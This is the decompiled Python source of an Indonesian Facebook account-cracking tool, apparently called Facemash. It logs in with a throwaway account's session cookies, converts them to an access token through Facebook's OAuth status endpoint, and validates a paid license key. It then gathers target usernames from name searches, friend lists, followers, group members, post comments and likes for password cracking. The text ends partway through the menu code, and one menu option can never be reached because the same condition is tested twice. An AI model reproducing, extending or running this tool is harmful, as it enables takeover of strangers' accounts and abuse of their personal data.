""" Decompiled by Exotic Hridoy """

try:
    import requests, re, json, time, datetime, os, random, base64, binascii, struct, io, uuid, urllib
    from Cryptodome.Cipher import AES
    from concurrent.futures import ThreadPoolExecutor
    from platform import platform
    from nacl.public import PublicKey, SealedBox
    from Crypto.Random import get_random_bytes
    from Cryptodome import Random as randoms
    from rich.panel import Panel
    from Crypto.Cipher import AES, PKCS1_v1_5
    from Crypto.PublicKey import RSA
    from rich import print
    from rich.console import Console
    from rich.tree import Tree
    from rich.columns import Columns
    from requests.exceptions import RequestException
except (Exception, KeyboardInterrupt) as e:
    from urllib.parse import quote
    __import__('os').system(f'xdg-open https://wa.me/6283847921480?text=FACEMASH%20%3A%20{quote(str(e))}');exit()

Dump, Password, Sukses, Checkpoint, Useragent, Manual, Looping, Status, Groups, Ganda, Type, Percobaan = [], {
    "Type": "Default"
}, [], [], {
    "Device": "REALME"
}, [], 0, {
    "Player": None
}, [], [], {
    "Dump": "GraphQL"
}, []

def Banner():
    os.system(
        'cls' if os.name == 'nt' else 'clear'
    )
    Console(width = 65, style = "bold dodger_blue3").print(Panel("""[bold red]●[bold yellow] ●[bold green] ●
[bold red]___________                                         .__     
\_   _____/____    ____  ____   _____ _____    _____|  |__  
 |    __) \__  \ _/ ___\/ __ \ /     \\\__  \  /  ___/  |  \ 
 |     \   / __ \\\  \__\  ___/|  Y Y  \/ __ \_\___ \|   Y  \\
[bold white] \___  /  (____  /\___  >___  >__|_|  (____  /____  >___|  /
     \/        \/     \/    \/      \/     \/     \/     \/ 
  [bold white]|| Author :[bold green] Rozhak[bold white] || Version :[bold red] 37.0[bold white] || Type :[bold green] Premium[bold white] ||""")) # Coded by Rozhak-XD
    return ("Sukses")

class Login:

    def __init__(self) -> None:
        pass

    def Cookies(self):
        try:
            Banner()
            Console(width = 65, style = "bold dodger_blue3").print(Panel("""[bold green]01[bold white]. Login Menggunakan Cookies Facebook ([bold green]GraphQL[bold white])
[bold green]02[bold white]. Login Menggunakan Cookies Facebook ([bold red]Graph[bold white])
[bold green]03[bold white]. Cara Mendapatkan Cookies Facebook
[bold green]04[bold white]. Keluar ([bold red]Exit[bold white])""", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Login Cookies)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
            choose = Console().input("[bold dodger_blue3]   ╰─> ")
            if choose == '1' or choose == '01':
                Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan[italic green] Cookie[italic white] Akun Facebook, Gunakan Akun Tumbal Untuk Login Dan Pastikan Menggunakan[italic red] Bahasa Indonesia[italic white].", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Input Cookies)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                cookies = Console().input("[bold dodger_blue3]   ╰─> ")
                self.name, self.user = self.Get_Akun(cookies)
                Type.update({
                    "Dump": "GraphQL"
                })
                Console(width = 65, style = "bold dodger_blue3").print(Panel(f"""[bold white]Name :[bold green] {self.name}
[bold white]User :[bold yellow] https://m.facebook.com/profile.php?id={self.user}""", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Welcome)[bold green] <[bold yellow]<[bold red]<"))
                with open('Data/Cookie.json', 'w') as w:
                    w.write(json.dumps({
                        'Cookie': cookies,
                    }))
                w.close()
                if os.path.exists('Data/Token.json') == True:
                    os.remove('Data/Token.json')
                time.sleep(3.5)
                Menu().Utama()
            elif choose == '2' or choose == '02':
                Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan[italic green] Cookie[italic white] Akun Facebook, Gunakan Akun Tumbal Untuk Login Dan Pastikan Menggunakan[italic red] Bahasa Indonesia[italic white].", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Input Cookies)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                cookies = Console().input("[bold dodger_blue3]   ╰─> ")
                self.access_token = self.Convert_To_Token(cookies)
                self.name, self.user = self.Akun_Saya(self.access_token, cookies)
                Type.update({
                    "Dump": "Graph"
                })
                Console(width = 65, style = "bold dodger_blue3").print(Panel(f"""[bold white]Name :[bold green] {self.name}
[bold white]User :[bold yellow] https://m.facebook.com/profile.php?id={self.user}""", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Welcome)[bold green] <[bold yellow]<[bold red]<"))
                with open('Data/Cookie.json', 'w') as w:
                    w.write(json.dumps({
                        'Cookie': cookies,
                    }))
                w.close()
                with open('Data/Token.json', 'w') as w:
                    w.write(json.dumps({
                        'Token': self.access_token,
                    }))
                w.close()
                time.sleep(3.5)
                Menu().Utama()
            elif choose == '2' or choose == '02':
                Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Sedang Diarahkan Ke Youtube Untuk Cara Mendapatkan Cookies!\n\t\t[italic green]https://youtu.be/3Y6xsMB3wRg", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Diarahkan Ke Youtube)[bold green] <[bold yellow]<[bold red]<"))
                time.sleep(3.5)
                os.system('xdg-open https://youtu.be/3Y6xsMB3wRg')
                exit()
            elif choose == '3' or choose == '03':
                Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Selamat Tinggal, Terimakasih Telah Menggunakan Tools Saya!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Keluar)[bold green] <[bold yellow]<[bold red]<"))
                exit()
            else:
                Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Daftar Menu!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Pilihan Tidak Diketahui)[bold green] <[bold yellow]<[bold red]<"))
                time.sleep(4.5)
                self.Cookies()
        except (Exception) as e:
            Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Error)[bold green] <[bold yellow]<[bold red]<"))
            exit()

    def Akun_Saya(self, access_token, cookies):
        with requests.Session() as r:
            r.headers.update({
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-encoding': 'gzip, deflate',
                'connection': 'keep-alive',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                'sec-fetch-mode': 'navigate',
                'upgrade-insecure-requests': '1',
                'sec-fetch-site': 'none',
                'sec-fetch-dest': 'document',
                'Host': 'graph.facebook.com',
                'sec-fetch-user': '?1',
                'accept-language': 'id,en;q=0.9',
            })
            params = {
                'access_token': access_token
            }
            response = r.get('https://graph.facebook.com/v18.0/me/?', params = params, cookies = {
                'cookie': cookies
            })
            self.json_data = json.loads(response.text)
            self.name, self.user_id = self.json_data['name'], self.json_data['id']
            return (self.name, self.user_id)

    def Convert_To_Token(self, cookies):
        with requests.Session() as r:
            params = {
                'client_id': '124024574287414',
                'wants_cookie_data': 'true',
                'origin': '1',
                'input_token': '',
                'sdk': 'joey',
                'redirect_uri': 'https://www.instagram.com/rozhak_official/',
            }
            r.headers.update({
                'accept-language': 'id,en;q=0.9',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                'referer': 'https://www.instagram.com/',
                'Host': 'www.facebook.com',
                'sec-fetch-mode': 'cors',
                'accept': '*/*',
                'connection': 'keep-alive',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-dest': 'empty',
                'origin': 'https://www.instagram.com',
                'accept-encoding': 'gzip, deflate',
            })
            response = r.get('https://www.facebook.com/x/oauth/status', params = params, cookies = {
                'cookie': cookies
            })
            if '"access_token":' in str(response.headers):
                self.your_token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
            else:
                Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic red]Cookies Kamu Sudah Tidak Valid Atau Akun Terkena Checkpoint!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Login Gagal)[bold green] <[bold yellow]<[bold red]<"))
                time.sleep(5.5)
                self.Cookies()
        return (self.your_token)

    def Get_Akun(self, cookies):
        with requests.Session() as r:
            r.headers.update({
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'sec-fetch-user': '?1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                'accept-language': 'en-US,en;q=0.9',
                'sec-fetch-dest': 'document',
                'Host': 'web.facebook.com',
            })
            response = r.get('https://web.facebook.com/', cookies = {
                'cookie': cookies
            }).text
            self.find_akun = re.search('{"ACCOUNT_ID":"(\d+)","USER_ID":".*?","NAME":"(.*?)"', str(response))
            self.name, self.user = self.find_akun.group(2), self.find_akun.group(1)
            if '"epsilon_checkpoint":' in str(response) or 'kami perlu mengonfirmasi bahwa akun ini milik Anda' in str(response):
                Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic red]Kami Melihat Aktivitas Tidak Biasa Dan Mengunci Akun Anda!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Login Checkpoint)[bold green] <[bold yellow]<[bold red]<"))
                time.sleep(5.5)
                self.Cookies()
            elif len(self.name) == 0 and int(self.user) == 0:
                Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic red]Cookies Kamu Sudah Tidak Valid Atau Akun Terkena Checkpoint!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Login Gagal)[bold green] <[bold yellow]<[bold red]<"))
                time.sleep(5.5)
                self.Cookies()
            else:
                return (self.name, self.user)

    def Get_Provider(self):
        try:
            with requests.Session() as r:
                response = r.get('https://ipinfo.io/json').json()
                self.ip, self.org = response['ip'], response['org']
            return (self.ip, self.org)
        except (Exception):
            return ('null', 'null')

    def Pengguna(self):
        try:
            with requests.Session() as r:
                response = r.get('https://justpaste.it/6dls1').text
                self.jumlah, self.online = re.search('"viewsText":"(.*?)"', str(response)).group(1), re.search('"onlineText":"(\d+)"', str(response)).group(1)
            return (self.jumlah, self.online)
        except (Exception) as e:
            return ('0', '0')

class Think_Facebook:

    def __init__(self) -> None:
        pass

    def Apikey(self):
        Banner()
        try:
            Console(width = 65, style = "bold dodger_blue3").print(Panel("""[bold green]01[bold white]. Login Menggunakan Apikey Facebook
[bold green]02[bold white]. Cara Mendapatkan Apikey
[bold green]03[bold white]. Keluar ([bold red]Exit[bold white])""", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Login Apikey)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
            choose = Console().input("[bold dodger_blue3]   ╰─> ")
            if choose == '1' or choose == '01':
                Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan[italic green] Apikey Facebook[italic white], Harap Gunakan[italic red] Satu Device[italic white] Agar Tidak Di Tolak Oleh[italic green] Server[italic white]!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Input Apikey)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                apikey = Console().input("[bold dodger_blue3]   ╰─> ")
                self.status, self.email, self.joined, self.expired = self.Validasi(apikey, platform())
                Status.update({
                    "Player": f"{self.status}"
                })
                Console(width = 65, style = "bold dodger_blue3").print(Panel(f"""[bold white]Expired :[bold green] {self.expired}[bold white] > [bold green]{self.status}
[bold white]Email :[bold yellow] {self.email}
[bold white]Joined :[bold red] {self.joined}""", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Welcome)[bold green] <[bold yellow]<[bold red]<"))
                with open('Data/Apikey.json', 'w') as w:
                    w.write(json.dumps({
                        'Apikey': apikey,
                    }))
                w.close()
                time.sleep(3.5)
                Menu().Utama()
            elif choose == '2' or choose == '02':
                Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Jika Anda Ingin Mendapatkan Apikey Trial Silahkan Hubungi ([italic red]https://wa.me/6283847921480[italic white]) Di WhatsApp!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Dapatkan Apikey)[bold green] <[bold yellow]<[bold red]<"));time.sleep(1.5)
                #Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Mendaftar Di ([italic green]https://instakey.rozhak.xyz/register/[italic white]) Lalu Isi Username, Email, Password Dan Konfirmasi Kode Dari Email. ([italic green]https://instakey.rozhak.xyz/getkey/[italic white]) Lalu Copy Apikey Kamu.", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Dapatkan Apikey)[bold green] <[bold yellow]<[bold red]<"));time.sleep(1.5)
                Console().input("[bold white][[bold green]Get Apikey[bold white]]")
                os.system('xdg-open https://wa.me/6283847921480')
                exit()
            elif choose == '3' or choose == '03':
                Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Selamat Tinggal, Terimakasih Telah Menggunakan Tools Saya!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Keluar)[bold green] <[bold yellow]<[bold red]<"))
                exit()
            else:
                Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Daftar Menu!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Pilihan Tidak Diketahui)[bold green] <[bold yellow]<[bold red]<"))
                time.sleep(4.5)
                self.Apikey()
        except (Exception) as e:
            Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Error)[bold green] <[bold yellow]<[bold red]<"))
            exit()
    
    def Validasi(self, apikey, platform):
        with requests.Session() as r:
            r.headers.update({
                'accept-language': 'en-US,en;q=0.9',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Host': 'instakey.rozhak.xyz',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            })
            params = {
                'key': apikey,
                'dev': platform
            }
            response = json.loads(r.get('https://instakey.rozhak.xyz/check.php', params = params).text)
            if 'maaf key yang anda masukan tidak terdaftar diserver kami' in str(response):
                Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Apikey Yang Kamu Masukan Tidak Terdaftar Diserver Kami!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Tidak Terdaftar)[bold green] <[bold yellow]<[bold red]<"))
                time.sleep(5.5)
                os.system('xdg-open https://wa.me/6283847921480')
                self.Apikey()
            else:
                if response['readtext'] == 'sudah kadaluarsa':
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Apikey Kamu Sudah Kadaluarsa Silahkan Upgrade Ke Premium!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Kadaluarsa)[bold green] <[bold yellow]<[bold red]<"))
                    time.sleep(5.5)
                    os.system('xdg-open https://wa.me/6283847921480')
                    if os.path.exists("Data/Apikey.json") == True:
                        os.remove('Data/Apikey.json')
                    Buy_Apikey()
                else:
                    if response['status_device'] == 'pemakaian device sudah habis, jika anda menggantikan device lagi maka akan ketolak server':
                        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Pemakaian Device Habis Hubungi Author Untuk Reset Device!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Limit Device)[bold green] <[bold yellow]<[bold red]<"))
                        time.sleep(5.5)
                        os.system('xdg-open https://wa.me/6283847921480')
                        self.Apikey()
                    elif response['status'] == 'berlaku':
                        if response['usage'].lower() == 'trial':
                            #if os.path.exists('/data/data/com.termux/Require.json') == False:
                                #try:
                                    #with open('/data/data/com.termux/Require.json', 'w') as w:
                                        #w.write(json.dumps({
                                            #'Apikey': apikey
                                        #}))
                                    #w.close()
                                #except (IOError):
                                    #Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Terminal Yang Anda Gunakan Tidak Terdeteksi Oleh Server Kami!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Kesalahan)[bold green] <[bold yellow]<[bold red]<"));time.sleep(5.5);self.Apikey()
                                return response['usage'].title(), response['email'], response['join'].replace(' ','/'), response['expired'].replace(' ','/')
                            #else:
                                #if str(apikey) in str(json.loads(open('/data/data/com.termux/Require.json', 'r').read())):
                                    #return response['usage'].title(), response['email'], response['join'].replace(' ','/'), response['expired'].replace(' ','/')
                                #else:
                                    #Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Tampaknya Kamu Sudah Pernah Mencoba Apikey Trial Sebelumnya!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Free Trial Limit)[bold green] <[bold yellow]<[bold red]<"));time.sleep(5.5);os.system('xdg-open https://wa.me/6283847921480');self.Apikey()
                        else:
                            return response['usage'].title(), response['email'], response['join'].replace(' ','/'), response['expired'].replace(' ','/')
                    else:
                        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Terjadi Kesalahan Saat Validasi Apikey, Harap Hubungi Author!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Error)[bold green] <[bold yellow]<[bold red]<"))
                        exit()
        return ("Error")

class Menu:

    def __init__(self) -> None:
        pass

    def Utama(self):
        if Type['Dump'] == 'GraphQL' and bool(os.path.exists('Data/Token.json')) == False:
            try:
                Banner()
                self.apikey = json.loads(open('Data/Apikey.json', 'r').read())['Apikey']
                self.status, self.email, self.joined, self.expired = Think_Facebook().Validasi(self.apikey, platform())
                Status.update({
                    "Player": f"{self.status}"
                })
                try:
                    self.cookies = json.loads(open('Data/Cookie.json', 'r').read())['Cookie']
                    self.name, self.user = Login().Get_Akun(self.cookies)
                    self.ip, self.org = Login().Get_Provider()
                except (Exception) as e:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic blue]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Error)[bold green] <[bold yellow]<[bold red]<"))
                    time.sleep(7.5)
                    Login().Cookies()
                Console(width = 65, style = "bold dodger_blue3").print(Columns([
                    Panel(f"""[bold white]Status :[bold yellow] {self.status[:19]}
[bold white]Expired :[bold red] {self.expired[:18]}
[bold white]Joined :[bold green] {self.joined[:19]}""", width = 32),
                    Panel(f"""[bold white]Name :[bold green] {self.name[:21]}
[bold white]IP :[bold red] {self.ip[:23]}
[bold white]User :[bold green] {self.user[:21]}""", width = 32),
                ]))
            except (Exception) as e:
                Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Error)[bold green] <[bold yellow]<[bold red]<"))
                time.sleep(7.5)
                Think_Facebook().Apikey()

            self.jumlah, self.online = Login().Pengguna()

            Console(width = 65, style = "bold dodger_blue3").print(Panel("""[bold green]01[bold white]. Crack Dari Pencarian Nama   [bold green]08[bold white]. Convert Username Jadi Id
[bold green]02[bold white]. Crack Dari Daftar Teman     [bold green]09[bold white]. Lihat Hasil Crack
[bold green]03[bold white]. Crack Dari Pengikut         [bold green]10[bold white]. Crack Dari Admin Group
[bold green]04[bold white]. Crack Dari Member Group     [bold green]11[bold white]. Crack Dari Email Acak
[bold green]05[bold white]. Crack Dari Komentar Post    [bold green]12[bold white]. Mencari Link Dana Kaget
[bold green]06[bold white]. Cek Options Checkpoint      [bold green]13[bold white].[bold red] Keluar
[bold green]07[bold white]. Crack Dari Like Postingan   """, title = f"[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Pengguna {self.jumlah}/{self.online} Online)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
            choose = Console().input("[bold dodger_blue3]   ╰─> ")
            if choose == '1' or choose == '01':
                try:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan Nama Target Gunakan Koma Untuk Memasukan Beberapa Nama, Seperti :[italic green] Rozhak,Mark Zuckerberg[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Stop!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Catatan)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                    nama = Console().input("[bold dodger_blue3]   ╰─> ")
                    for name in nama.split(','):
                        Dumps_GraphQL().Get_Query_Count(self.cookies, name)
                    if len(Dump) == 0 or len(Dump) < 10:
                        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Untuk Jumlah Username Yang Terkumpul Harus Lebih Dari 10 Username, Silahkan Untuk Mencari Target Yang Benar!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Dump Gagal)[bold green] <[bold yellow]<[bold red]<"))
                        exit()
                    else:
                        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Jumlah Username :[italic green] {len(Dump)}"))
                        Pilihan().Settingan()
                except (Exception) as e:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Error)[bold green] <[bold yellow]<[bold red]<"))
                    exit()
            elif choose == '2' or choose == '02':
                try:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan Uid Akun Facebook Target Pastikan Memiliki Teman Dan Dapat Terlhat Oleh Publik Anda Juga Dapat Menggunakan Koma Untuk Dump Masal, Seperti :[italic green] 100006609458697,757953543[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Stop!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Catatan)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                    userid = Console().input("[bold dodger_blue3]   ╰─> ")
                    for user in userid.split(','):
                        if user.isnumeric() == True:
                            Dumps_GraphQL().Get_Friends_Count(self.cookies, user)
                        else:
                            continue
                    if len(Dump) == 0 or len(Dump) < 200:
                        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Untuk Jumlah Username Yang Terkumpul Harus Lebih Dari 200 Username, Silahkan Untuk Mencari Target Yang Benar!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Dump Gagal)[bold green] <[bold yellow]<[bold red]<"))
                        exit()
                    else:
                        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Jumlah Username :[italic green] {len(Dump)}"))
                        Pilihan().Settingan()
                except (Exception) as e:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Error)[bold green] <[bold yellow]<[bold red]<"))
                    exit()
            elif choose == '3' or choose == '03':
                try:
                    if self.status == 'Premium':
                        Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan Uid Akun Facebook Target Pastikan Memiliki Pengikut Dan Dapat Terlhat Oleh Publik Anda Juga Dapat Menggunakan Koma Untuk Dump Masal, Seperti :[italic green] 100006609458697,757953543[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Stop!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Catatan)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                        userid = Console().input("[bold dodger_blue3]   ╰─> ")
                        for user in userid.split(','):
                            if user.isnumeric() == True:
                                Dumps_GraphQL().Get_Followers_Count(self.cookies, user)
                            else:
                                continue
                        if len(Dump) == 0 or len(Dump) < 150:
                            Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Untuk Jumlah Username Yang Terkumpul Harus Lebih Dari 150 Username, Silahkan Untuk Mencari Target Yang Benar!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Dump Gagal)[bold green] <[bold yellow]<[bold red]<"))
                            exit()
                        else:
                            Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Jumlah Username :[italic green] {len(Dump)}"))
                            Pilihan().Settingan()
                    else:
                        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Hanya Member Premium Yang Dapat Mengakses Fitur Ini!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Bukan Premium)[bold green] <[bold yellow]<[bold red]<"))
                        exit()
                except (Exception) as e:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Error)[bold green] <[bold yellow]<[bold red]<"))
                    exit()
            elif choose == '4' or choose == '04':
                try:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan Uid Group Pastikan Group Tersebut Tidak Terkunci Dan Gunakan Koma Untuk Dump Masal, Seperti :[italic green] 286209422822253,5324263181026009,3691206277644100[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Stop!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Catatan)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                    userid = Console().input("[bold dodger_blue3]   ╰─> ")
                    for user in userid.split(','):
                        if user.isnumeric() == True:
                            Dumps_GraphQL().Get_Member_Count(self.cookies, user)
                        else:
                            continue
                    if len(Dump) == 0 or len(Dump) < 150:
                        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Untuk Jumlah Username Yang Terkumpul Harus Lebih Dari 150 Username, Silahkan Untuk Mencari Target Yang Benar!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Dump Gagal)[bold green] <[bold yellow]<[bold red]<"))
                        exit()
                    else:
                        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Jumlah Username :[italic green] {len(Dump)}"))
                        Pilihan().Settingan()
                except (Exception) as e:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Error)[bold green] <[bold yellow]<[bold red]<"))
                    exit()
            elif choose == '5' or choose == '05':
                try:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan Link Postingan Pastikan Memiliki Komentar Dan Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] https://www.fac\nebook.com/100006609458697/posts/pfbid02K7gUUAnBXnng64cdjLRreC7yJHa8QCB8kfXbiq3NtrFiWpqNscn6j9biBmKER8Btl/?app=fbl[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Stop!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Catatan)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                    postingan = Console().input("[bold dodger_blue3]   ╰─> ")
                    for link_post in postingan.split(','):
                        link_post = ('https://web.facebook.com/{}'.format(link_post.split('facebook.com/')[1]))
                        Dumps_GraphQL().Get_Komentar_Count(self.cookies, link_post)
                    if len(Dump) == 0 or len(Dump) < 50:
                        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Untuk Jumlah Username Yang Terkumpul Harus Lebih Dari 50 Username, Silahkan Untuk Mencari Target Yang Benar!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Dump Gagal)[bold green] <[bold yellow]<[bold red]<"))
                        exit()
                    else:
                        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Jumlah Username :[italic green] {len(Dump)}"))
                        Pilihan().Settingan()
                except (Exception) as e:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Error)[bold green] <[bold yellow]<[bold red]<"))
                    exit()
            elif choose == '6' or choose == '06':
                try:
                    Checker().Your_Files()
                except (Exception) as e:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Error)[bold green] <[bold yellow]<[bold red]<"))
                    exit()
            elif choose == '7' or choose == '07':
                try:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan Link Postingan Pastikan Memiliki Likes Dan Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] https://www.fac\nebook.com/100006609458697/posts/pfbid02K7gUUAnBXnng64cdjLRreC7yJHa8QCB8kfXbiq3NtrFiWpqNscn6j9biBmKER8Btl/?app=fbl[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Stop!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Catatan)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                    postingan = Console().input("[bold dodger_blue3]   ╰─> ")
                    for link_post in postingan.split(','):
                        link_post = ('https://web.facebook.com/{}'.format(link_post.split('facebook.com/')[1]))
                        Dumps_GraphQL().Get_Likes_Count(self.cookies, link_post)
                    if len(Dump) == 0 or len(Dump) < 50:
                        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Untuk Jumlah Username Yang Terkumpul Harus Lebih Dari 50 Username, Silahkan Untuk Mencari Target Yang Benar!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Dump Gagal)[bold green] <[bold yellow]<[bold red]<"))
                        exit()
